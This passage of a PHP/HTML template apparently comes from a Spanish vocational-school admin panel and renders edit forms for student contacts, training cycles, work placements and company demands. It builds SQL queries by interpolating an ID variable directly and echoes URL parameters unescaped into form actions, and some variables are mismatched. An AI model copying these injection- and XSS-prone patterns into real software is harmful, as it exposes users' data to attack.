                                  <tr>
                                    <td height="22" bgcolor="#F8F8F8">&nbsp;Poblacion</td>
                                    <td bgcolor="#F8F8F8"><label>
                                      <input name="poblacion" type="text" class="texte_normal" id="textfield34" value="<?php echo $poblacion ?>" />
                                    </label></td>
                                  </tr>
                                  <tr>
                                    <td height="22" bgcolor="#F8F8F8">&nbsp;CP</td>
                                    <td bgcolor="#F8F8F8"><label>
                                      <input name="cp" type="text" class="texte_normal" id="textfield35" value="<?php echo $cp ?>" />
                                    </label></td>
                                  </tr>
                                  <tr>
                                    <td height="22" bgcolor="#F8F8F8">&nbsp;Provincia</td>
                                    <td bgcolor="#F8F8F8"><label>
                                      <input name="provincia" type="text" class="texte_normal" id="textfield36" value="<?php echo $provincia ?>" />
                                    </label></td>
                                  </tr>
                                  <tr>
                                    <td height="22" bgcolor="#F8F8F8">&nbsp;Telf</td>
                                    <td bgcolor="#F8F8F8"><label>
                                      <input name="telf" type="text" class="texte_normal" id="textfield37" value="<?php echo $telf ?>" />
                                    </label></td>
                                  </tr>
                                  <tr>
                                    <td height="22" bgcolor="#F8F8F8">&nbsp;Movil</td>
                                    <td bgcolor="#F8F8F8"><label>
                                      <input name="movil" type="text" class="texte_normal" id="textfield38" value="<?php echo $movil ?>" />
                                    </label></td>
                                  </tr>
                                  <tr>
                                    <td height="22" bgcolor="#F8F8F8">&nbsp;Email</td>
                                    <td bgcolor="#F8F8F8"><label>
                                      <input name="email" type="text" class="texte_normal" id="textfield39" value="<?php echo $email ?>" />
                                    </label></td>
                                  </tr>
                                  <tr>
                                    <td height="22" bgcolor="#F8F8F8">&nbsp;Experiencia</td>
                                    <td bgcolor="#F8F8F8"><label>
                                      <input name="exp" type="text" class="texte_normal" id="textfield40" value="<?php echo $exp ?>" />
                                    </label></td>
                                  </tr>
                                  <tr>
                                    <td height="22" bgcolor="#F8F8F8">&nbsp;Exp. Profesional</td>
                                    <td bgcolor="#F8F8F8"><label>
                                      <input name="exppro" type="text" class="texte_normal" id="textfield41" value="<?php echo $exppro ?>" />
                                    </label></td>
                                  </tr>
                                  <tr>
                                    <td height="22" bgcolor="#F8F8F8">&nbsp;Estudios</td>
                                    <td bgcolor="#F8F8F8"><label>
                                      <input name="estudios" type="text" class="texte_normal" id="textfield42" value="<?php echo $estudios ?>" />
                                    </label></td>
                                  </tr>
                                  <tr>
                                    <td height="26" bgcolor="#F8F8F8">&nbsp;</td>
                                    <td align="left" bgcolor="#F8F8F8"><label>
                                      <input name="button3" type="submit" class="texte_normal" id="button3" value="Guardar" />
                                    </label></td>
                                  </tr>
                                </table>
                                </form>
                                <?php } ?> 
                                
                                
                                
                                <?php if (($_GET['menu']==3) && ($_GET['sub']==3)) { //Ciclos formativos
								
										$result = $db->Execute("SELECT * FROM CDE_cicleform WHERE id = $idedit");
										if ($result === false) die("failed"); 
										
										$id = $result->fields[0];
										$idf = $result->fields[1];
										$cicle = $result->fields[2];
										$codi = $result->fields[3];
										$duracio = $result->fields[4];
										
								?>
                                <form id="form3" name="form3" method="post" action="index.php?menu=<?php echo $_GET['menu'] ?>&sub=<?php echo $_GET['sub'] ?>&edit=<?php echo $id ?>&ok" style="margin:0px">
									<table width="290" border="0" align="center" cellpadding="0" cellspacing="0" class="texte_normal">
                                  <tr>
                                    <td height="22" bgcolor="#F8F8F8">&nbsp;Familia</td>
                                    <td bgcolor="#F8F8F8"><label>
                                      <select name="idf" class="texte_normal" id="idf">
                                     <?php  $result = $db->Execute("SELECT * FROM CDE_famciclos ORDER BY id DESC"); 
                                            while (!$result->EOF) {
                                
                                            $id = $result->fields[0];
                                            $nombre = $result->fields[1];
                                            $nombre = substr($nombre,0,25);
											
										if($id==$idf){ ?>
                                        
                                    <option value="<?php echo $id ?>" selected="selected"><?php echo htmlentities($nombre)."..." ?></option>
                                    
                                    <?php } else { ?>
                                    
                                    <option value="<?php echo $id ?>"><?php echo htmlentities($nombre)."..." ?></option>
                                    
                                    <?php
									}
                                    $result->MoveNext();
                                    }	 
                                    ?>
                                    </select>
                                    </label></td>
                                  </tr>
                                  <tr>
                                    <td width="120" height="22" bgcolor="#F8F8F8">&nbsp;Ciclo</td>
                                    <td width="170" bgcolor="#F8F8F8"><label>
                                      <input name="cicle" type="text" class="texte_normal" id="cicle" value="<?php echo htmlentities($cicle) ?>" />
                                    </label></td>
                                  </tr>
                                  <tr>
                                    <td height="22" bgcolor="#F8F8F8">&nbsp;Codigo</td>
                                    <td bgcolor="#F8F8F8"><label>
                                      <input name="codi" type="text" class="texte_normal" id="codi" value="<?php echo htmlentities($codi) ?>" />
                                    </label></td>
                                  </tr>
                                  <tr>
                                    <td height="22" bgcolor="#F8F8F8">&nbsp;Horas</td>
                                    <td bgcolor="#F8F8F8"><label>
                                      <input name="duracio" type="text" class="texte_normal" id="textfield43" value="<?php echo htmlentities($duracio) ?>" />
                                    </label></td>
                                  </tr>
                                  <tr>
                                    <td height="26" bgcolor="#F8F8F8">&nbsp;</td>
                                    <td align="left" bgcolor="#F8F8F8"><label>
                                      <input name="button4" type="submit" class="texte_normal" id="button4" value="Guardar" />
                                    </label></td>
                                  </tr>
                                </table>
                                </form>
                                <?php } ?> 
                                
                                
                                
                                <?php if (($_GET['menu']==3) && ($_GET['sub']==4)) {  //FCT
								$result = $db->Execute("SELECT * FROM CDE_fct WHERE id = $idedit");
								if ($result === false) die("failed"); 
										
										$id = $result->fields[0];
										$alumne = $result->fields[1];
										$empresa = $result->fields[2];
										$cicle = $result->fields[3];
										$curs = $result->fields[4];
										$finicio = $result->fields[5];
										$ffin = $result->fields[6];
										$evaluacion = $result->fields[7];
										$revaluacion = $result->fields[8];
								?>
                                
                                <form id="form3" name="form3" method="post" action="index.php?menu=<?php echo $_GET['menu'] ?>&sub=<?php echo $_GET['sub'] ?>&edit=<?php echo $id ?>&ok" style="margin:0px">
                                <table width="290" border="0" align="center" cellpadding="0" cellspacing="0" class="texte_normal">
                                  <tr>
                                    <td width="80" height="22" bgcolor="#F8F8F8">&nbsp;Alumne</td>
                                    <td width="210" bgcolor="#F8F8F8"><label>
                                      <select name="alumne" class="texte_normal" id="alumne">
                                        <?php  $result = $db->Execute("SELECT * FROM CDE_alumnos ORDER BY alumne ASC"); 
												while (!$result->EOF) {
												
												$id = $result->fields[0];
												$nombre = $result->fields[1];
												$nombre = substr($nombre,0,21);
												
										if($id==$alumne){ 
										?>
										<option value="<?php echo $id ?>" selected="selected"><?php echo htmlentities($nombre)."..." ?></option>
                                        <?php } else { ?>
                                        <option value="<?php echo $id ?>"><?php echo htmlentities($nombre)."..." ?></option>
										<?php	}
												$result->MoveNext();
												}	 
                                		?>
                                    </select>
                                    </label></td>
                                  </tr>
                                  <tr>
                                    <td height="22" bgcolor="#F8F8F8">&nbsp;Empresa</td>
                                    <td bgcolor="#F8F8F8"><label>
                                      <select name="empresa" class="texte_normal" id="idf3">
                                        <?php  $result = $db->Execute("SELECT * FROM CDE_empresas ORDER BY nombre ASC"); 
                                while (!$result->EOF) {
                                
                                $id = $result->fields[0];
                                $nombre = $result->fields[1];
                                $nombre = substr($nombre,0,21);
                               if($id==$empresa){ 
										?>
										<option value="<?php echo $id ?>" selected="selected"><?php echo htmlentities($nombre)."..." ?></option>
                                        <?php } else { ?>
                                        <option value="<?php echo $id ?>"><?php echo htmlentities($nombre)."..." ?></option>
                                        <?php }
                                $result->MoveNext();
                                }	 
                                ?>
                                    </select>
                                    </label></td>
                                  </tr>
                                  <tr>
                                    <td height="22" bgcolor="#F8F8F8">&nbsp;Ciclo</td>
                                    <td bgcolor="#F8F8F8"><label>
                                      <select name="cicle" class="texte_normal" id="idf4">
                                        <?php  $result = $db->Execute("SELECT * FROM CDE_cicleform ORDER BY id DESC"); 
                                while (!$result->EOF) {
                                
                                $id = $result->fields[0];
                                $nombre = $result->fields[2];
                                $nombre = substr($nombre,0,24);
                                if($id==$cicle){ 
										?>
										<option value="<?php echo $id ?>" selected="selected"><?php echo htmlentities($nombre)."..." ?></option>
                                        <?php } else { ?>
                                        <option value="<?php echo $id ?>"><?php echo htmlentities($nombre)."..." ?></option>
                                        <?php }
                                $result->MoveNext();
                                }	 
                                ?>
                                    </select>
                                    </label></td>
                                  </tr>
                                  <tr>
                                    <td height="22" bgcolor="#F8F8F8">&nbsp;Curso</td>
                                    <td bgcolor="#F8F8F8"><label>
                                      <select name="curs" class="texte_normal" id="idf5">
                                        <?php  $result = $db->Execute("SELECT * FROM CDE_cursos ORDER BY id_curso ASC"); 
                                while (!$result->EOF) {
                                
                                $id = $result->fields[0];
                                $nombre = $result->fields[1];
                                $nombre = substr($nombre,0,23);
                               if($id==$curs){ 
										?>
										<option value="<?php echo $id ?>"><?php echo htmlentities($nombre)."..." ?></option>
                                        <?php } else { ?>
                                        <option value="<?php echo $id ?>"><?php echo htmlentities($nombre)."..." ?></option>
                                <?php } 
                                $result->MoveNext();
                                }	 
                                ?>
                                      </select>
                                    </label></td>
                                  </tr>
                                  <tr>
                                    <td height="22" bgcolor="#F8F8F8">&nbsp;F. inicio</td>
                                    <td bgcolor="#F8F8F8"><label>
                                      <input name="finicio" type="text" class="texte_normal" id="textfield44" value="<?php echo $finicio ?>" />
                                    </label></td>
                                  </tr>
                                  <tr>
                                    <td height="22" bgcolor="#F8F8F8">&nbsp;F. fin</td>
                                    <td bgcolor="#F8F8F8"><label>
                                      <input name="ffin" type="text" class="texte_normal" id="textfield45" value="<?php echo $ffin ?>" />
                                    </label></td>
                                  </tr>
                                  <tr>
                                    <td height="22" bgcolor="#F8F8F8">&nbsp;Evaluacion</td>
                                    <td bgcolor="#F8F8F8"><label>
                                      <input name="evaluacion" type="text" class="texte_normal" id="textfield46" value="<?php echo $evaluacion ?>" />
                                    </label></td>
                                  </tr>
                                  <tr>
                                    <td height="22" bgcolor="#F8F8F8">&nbsp;Recu. Ev</td>
                                    <td bgcolor="#F8F8F8"><label>
                                      <input name="revaluacion" type="text" class="texte_normal" id="textfield47" value="<?php echo $revaluacion ?>" />
                                    </label></td>
                                  </tr>
                                  <tr>
                                    <td height="26" bgcolor="#F8F8F8">&nbsp;</td>
                                    <td align="left" bgcolor="#F8F8F8"><label>
                                      <input name="button6" type="submit" class="texte_normal" id="button6" value="Guardar" />
                                    </label></td>
                                  </tr>
                                </table>
                                </form>
                                <?php } ?> 
                                
                                
                                
                                <?php if (($_GET['menu']==3) && ($_GET['sub']==5)) {  //Demandas
									$result = $db->Execute("SELECT * FROM CDE_demandas WHERE id = $idedit");
									if ($result === false) die("failed"); 
										
										$id = $result->fields[0];
										$cicle = $result->fields[1];
										$empresa = $result->fields[2];
										$fecha = $result->fields[3];
										$p_recoge = $result->fields[4];
										$f_respuesta = $result->fields[5];
										$p_responde = $result->fields[6];
										$c_demanda = $result->fields[7];
										$cargo = $result->fields[8];
										$ciudad = $result->fields[9];
										$provincia = $result->fields[10];
										$t_demanda = $result->fields[11];
										$fax_demanda = $result->fields[12];
										$mail_contacta = $result->fields[13];
										$contactar = $result->fields[14];
										$llamar = $result->fields[15];
										$colaborar = $result->fields[16];
										$notas = $result->fields[17];
								
								?>
                                <form id="form3" name="form3" method="post" action="index.php?menu=<?php echo $_GET['menu'] ?>&sub=<?php echo $_GET['sub'] ?>&edit=<?php echo $id ?>&ok" style="margin:0px">
                                <table width="290" border="0" align="center" cellpadding="0" cellspacing="0" class="texte_normal">
                                                                  <tr>
                                                                    <td width="120" height="22" bgcolor="#F8F8F8">&nbsp;Ciclo</td>
                                                                    <td width="170" bgcolor="#F8F8F8"><label>
                                                                    <select name="cicle" class="texte_normal" id="cicle">
                                                                      <?php  $result = $db->Execute("SELECT * FROM CDE_cicleform ORDER BY id DESC"); 
                                while (!$result->EOF) {
                                
                                $id = $result->fields[0];
                                $nombre = $result->fields[2];
                                $nombre = substr($nombre,0,24);
                                if($id==$cicle){ 
										?>
                                                                      <option value="<?php echo $id ?>" selected="selected"><?php echo htmlentities($nombre)."..." ?></option>
                                                                      <?php } else { ?>
                                                                      <option value="<?php echo $id ?>"><?php echo htmlentities($nombre)."..." ?></option>
                                                                      <?php }
                                $result->MoveNext();
                                }	 
                                ?>
                                                                    </select>
                                                                    </label></td>
                                                                  </tr>
                                                                  <tr>
                                                                    <td height="22" bgcolor="#F8F8F8">&nbsp;Empresa</td>
                                                                    <td bgcolor="#F8F8F8"><label>
                                                                    <select name="empresa" class="texte_normal" id="empresa">
                                                                      <?php  $result = $db->Execute("SELECT * FROM CDE_empresas ORDER BY nombre ASC"); 
                                while (!$result->EOF) {
                                
                                $id = $result->fields[0];
                                $nombre = $result->fields[1];
                                $nombre = substr($nombre,0,21);
                               if($id==$empresa){ 
										?>
                                                                      <option value="<?php echo $id ?>" selected="selected"><?php echo htmlentities($nombre)."..." ?></option>
                                                                      <?php } else { ?>
                                                                      <option value="<?php echo $id ?>"><?php echo htmlentities($nombre)."..." ?></option>
                                                                      <?php }
                                $result->MoveNext();
                                }	 
                                ?>
                                                                    </select>
                                                                    </label></td>
                                                                  </tr>
                                                                  <tr>
                                                                    <td height="22" bgcolor="#F8F8F8">&nbsp;Fecha</td>
                                                                    <td bgcolor="#F8F8F8"><label>
                                                                      <input name="fecha" type="text" class="texte_normal" id="textfield48" value="<?php echo htmlentities($fecha) ?>" />
                                                                    </label></td>
                                                                  </tr>
                                                                  <tr>
                                                                    <td height="22" bgcolor="#F8F8F8">&nbsp;P.Recoje</td>
                                                                    <td bgcolor="#F8F8F8"><label>
                                                                      <input name="p_recoje" type="text" class="texte_normal" id="textfield49" value="<?php echo htmlentities($p_recoje) ?>" />
                                                                    </label></td>
                                                                  </tr>
                                                                  <tr>
                                                                    <td height="22" bgcolor="#F8F8F8">&nbsp;F.Pregunta</td>
                                                                    <td bgcolor="#F8F8F8"><label>
                                                                      <input name="f_respuesta" type="text" class="texte_normal" id="textfield50" value="<?php echo htmlentities($f_respuesta) ?>" />
                                                                    </label></td>
                                                                  </tr>
                                                                  <tr>
                                                                    <td height="22" bgcolor="#F8F8F8">&nbsp;P.Responde</td>
                                                                    <td bgcolor="#F8F8F8"><label>
                                                                      <input name="p_responde" type="text" class="texte_normal" id="textfield50" value="<?php echo htmlentities($p_responde) ?>" />
                                                                    </label></td>
                                                                  </tr>
                                                                  <tr>
                                                                    <td height="22" bgcolor="#F8F8F8">&nbsp;C.Demanda</td>
                                                                    <td bgcolor="#F8F8F8"><label>
                                                                      <input name="c_demanda" type="text" class="texte_normal" id="textfield49" value="<?php echo htmlentities($c_demanda) ?>" />
                                                                    </label></td>
                                                                  </tr>
                                                                  <tr>
                                                                    <td height="22" bgcolor="#F8F8F8">&nbsp;Cargo</td>
                                                                    <td bgcolor="#F8F8F8"><label>
                                                                      <input name="cargo" type="text" class="texte_normal" id="textfield49" value="<?php echo htmlentities($cargo) ?>" />
                                                                    </label></td>
                                                                  </tr>
                                                                  <tr>
                                                                    <td height="22" bgcolor="#F8F8F8">&nbsp;Ciudad</td>
                                                                    <td bgcolor="#F8F8F8"><label>
                                                                      <input name="ciudad" type="text" class="texte_normal" id="textfield50" value="<?php echo htmlentities($ciudad) ?>" />
                                                                    </label></td>
                                                                  </tr>
                                                                  <tr>
                                                                    <td height="22" bgcolor="#F8F8F8">&nbsp;Provincia</td>
                                                                    <td bgcolor="#F8F8F8"><label>
                                                                      <input name="provincia" type="text" class="texte_normal" id="textfield51" value="<?php echo htmlentities($provincia) ?>" />
                                                                    </label></td>
                                                                  </tr>
                                                                  <tr>
                                                                    <td height="22" bgcolor="#F8F8F8">&nbsp;Telf Demanda</td>
                                                                    <td bgcolor="#F8F8F8"><label>
                                                                      <input name="t_demanda" type="text" class="texte_normal" id="textfield52" value="<?php echo htmlentities($t_demanda) ?>" />
                                                                    </label></td>
                                                                  </tr>
                                                                  <tr>
                                                                    <td height="22" bgcolor="#F8F8F8">&nbsp;Fax Demanda</td>
                                                                    <td bgcolor="#F8F8F8"><label>
                                                                      <input name="fax_demanda" type="text" class="texte_normal" id="textfield53" value="<?php echo htmlentities($fax_demanda) ?>" />
                                                                    </label></td>
                                                                  </tr>
                                                                  <tr>
                                                                    <td height="22" bgcolor="#F8F8F8">&nbsp;Mail Demanda</td>
                                                                    <td bgcolor="#F8F8F8"><label>
                                                                      <input name="mail_demanda" type="text" class="texte_normal" id="textfield54" value="<?php echo htmlentities($mail_demanda) ?>" />
                                                                    </label></td>
                                                                  </tr>
                                                                  <tr>
                                                                    <td height="22" bgcolor="#F8F8F8">&nbsp;Contactar</td>
                                                                    <td bgcolor="#F8F8F8"><label>
                                                                      <select name="contactar" class="texte_normal" id="contactar">
                                                                        <option <?php if ($contactar=='si') { ?>selected="selected"<?php } ?>>Si</option>
                                                                        <option <?php if ($contactar=='no') { ?>selected="selected"<?php } ?>>No</option>
                                                                    </select>
                                                                    </label></td>
                                                                  </tr>
                                                                  <tr>
                                                                    <td height="22" bgcolor="#F8F8F8">&nbsp;Llamar</td>
                                                                    <td bgcolor="#F8F8F8"><label>
                                                                      <select name="llamar" class="texte_normal" id="llamar">
                                                                        <option <?php if ($llamar=='si') { ?>selected="selected"<?php } ?>>Si</option>
                                                                        <option <?php if ($llamar=='no') { ?>selected="selected"<?php } ?>>No</option>
                                                                    </select>
                                                                    </label></td>
                                                                  </tr>
                                                                  <tr>
                                                                    <td height="22" bgcolor="#F8F8F8">&nbsp;Colaborar</td>
                                                                    <td bgcolor="#F8F8F8"><label>
                                                                      <select name="colaborar" class="texte_normal" id="colaborar">
                                                                        <option <?php if ($colaborar=='si') { ?>selected="selected"<?php } ?>>Si</option>
                                                                        <option <?php if ($colaborar=='no') { ?>selected="selected"<?php } ?>>No</option>
                                                                    </select>
                                                                    </label></td>
                                                                  </tr>
                                                                  <tr>
                                                                    <td height="22" bgcolor="#F8F8F8">&nbsp;Notas</td>
                                                                    <td bgcolor="#F8F8F8"><label>
                                                                      <textarea name="notas" rows="4" class="texte_normal" id="notas"><?php echo htmlentities($notas) ?></textarea>
                                                                    </label></td>
                                                                  </tr>
                                                                  <tr>
                                                                    <td height="26" bgcolor="#F8F8F8">&nbsp;</td>
                                                                    <td align="left" bgcolor="#F8F8F8"><label>
                                                                      <input name="button7" type="submit" class="texte_normal" id="button7" value="Guardar" />
                                                                    </label></td>
                                                                  </tr>
                                </table>
								</form>
                                <?php } ?> 
                                    <br />
